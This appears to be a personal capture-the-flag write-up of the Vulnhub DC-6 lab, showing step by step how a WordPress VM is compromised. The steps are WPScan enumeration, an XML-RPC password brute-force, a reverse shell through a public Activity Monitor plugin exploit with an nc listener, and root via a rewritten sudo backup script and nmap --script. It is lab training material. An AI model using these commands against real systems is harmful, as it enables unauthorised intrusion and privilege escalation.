
---

Vulnhub URL: https://www.vulnhub.com/entry/dc-6,315/
Key Note - edit hosts for wordy 
Save password hunting time
`cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt` 



\[OS]: Debian
\[Web-Technology]: Apache 2.4.25
\[Hostname]:  DC-6
\[IP]:  192.168.56.115
\[USERS]:   WPUsers - admin, mark, graham, sarah, jens
\[CREDENTIALS]:  

mark :: helpdesk01
graham :: GSo7isUM1D4


---
\[To-Try LIST]:  

Webserver 80 -> WPScan 5.1.1

SSH 22 - needs credentials

---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
MAC Address: 08:00:27:25:14:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X



--- 

\[Web Services Enumeration]:   

Add wordy to /etc/hosts and rerun nmap -> now can access webpage
Site exploration: Just another Wordpress site
Wordpress 5.1.1

```bash
export URL=http://wordy/
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

## WPScan Findings
XML-RPC enabled - http://wordy/xmlrpc.php

Users found: # add to users
admin
mark
graham
sarah
jens


# WP Scan bruteforce - remember to use custom wordlist as per note at start
wpscan --url $URL --disable-tls-checks -U users -P passwords.txt

# Performing password attack on Xmlrpc against 5 user/s

mark / helpdesk01

# Works for: http://wordy/wp-admin/ - Does not work for ssh

```
Found some emails
![[Pasted image 20251101051314.png]]

```bash
searchsploit wordpress activity monitor

searchsploit -m 45274

```

![[Pasted image 20251101054526.png]]
```bash
nc -nlvp 9999
file:///home/jesse/Machines/DC-6/scripts/45274.html
```


![[Pasted image 20251101054655.png]]

![[Pasted image 20251101055728.png]]

---


\[OTHER / PRIVILEGE-ESCALATION]:   

**Persistence**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@dc-6:/var/www/html/wp-admin$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
<l/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
www-data@dc-6:/var/www/html/wp-admin$ export TERM=xterm-256color
www-data@dc-6:/var/www/html/wp-admin$ 
alias ll='ls -lsaht --color=auto'
www-data@dc-6:/var/www/html/wp-admin$ ^Z
zsh: suspended  nc -nlvp 9999

┌──(jesse㉿vbox)-[~]
└─$ stty raw -echo ; fg ; reset
[1]  + continued  nc -nlvp 9999
stty columns 200 rows 200
www-data@dc-6:/var/www/html/wp-admin$ 

```

**Privesc**
```bash
cd /home

ls mark/ jens/ sarah/ graham/

# jens/backup.sh mark/stuff

cat /mark/stuff/things-to-do.txt
# - Add new user: graham - GSo7isUM1D4 - done


www-data@dc-6:/home$ ls -l jens
total 4
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh 
www-data@dc-6:/home$ cat jens/backups.sh 
#!/bin/bash
tar -czf backups.tar.gz /var/www/html


# We cannot modify as we are not in devs but we can run 

su - graham
groups #graham, devs - in devs can modify

sudo -l
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
    
#Graham can run this commands as jens without needed a password backup.sh
# Graham is also in the devs group and can modify - this means he can open a shell as jens

# Modify backup .sh

#!/bin/bash
/bin/bash


# run it
sudo -u jens /home/jens/backups.sh


#Now we are jens
sudo -l

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap

#GTFO Bins - nmap
jens@dc-6:~$ TF=$(mktemp)
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > $TF
jens@dc-6:~$ sudo nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2025-11-01 20:20 AEST
NSE: Warning: Loading '/tmp/tmp.SbX6U2X5eD' -- the recommended file extension is '.nse'.
# Now we are root - not echo was off for this version




```
![[Pasted image 20251101062206.png]]
--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
